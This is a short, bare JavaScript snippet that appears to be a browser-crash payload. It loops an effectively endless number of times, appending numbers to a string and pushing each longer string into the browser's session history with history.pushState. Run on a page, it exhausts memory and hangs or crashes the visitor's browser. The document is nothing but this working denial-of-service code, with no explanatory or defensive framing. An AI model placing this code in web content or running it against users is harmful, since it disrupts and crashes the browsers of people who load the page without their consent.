var total = ""
for( var i = 0; i < 99999999999999999999999999999999; i++ ) 
{
   	total = total + i.toString();
    history.pushState(0,0, total );
}
